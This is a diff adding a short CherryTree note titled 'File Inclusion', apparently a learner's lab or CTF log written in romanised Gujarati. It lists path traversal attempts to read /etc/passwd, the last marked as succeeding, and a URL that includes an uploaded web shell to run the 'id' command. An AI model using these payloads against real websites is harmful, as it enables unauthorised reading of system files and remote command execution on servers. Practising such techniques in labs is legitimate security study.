@@ -1,0 +1,21 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="30" master_id="0" name="File Inclusion" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1751717667" ts_lastsave="1751717983">
+    <rich_text>mane nathi khabar pan ha mane maaru answer mali gyo mai niche no payload try karyo ane aa vastu mali gay
+
+
+mane lagyu ke jo hu command run kari saku to mai aa vastu o try kari
+
+
+http://site.com/index.php?language=../../uploads/myshell.php&amp;cmd=id
+</rich_text>
+    <codebox char_offset="106" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">1st try
+../../../etc/passwd
+2nd try
+/etc/passwd
+3rd try 
+try to scan nmap to get another info
+4th try
+../../../../etc/passwd											Succed</codebox>
+  </node>
+</cherrytree>
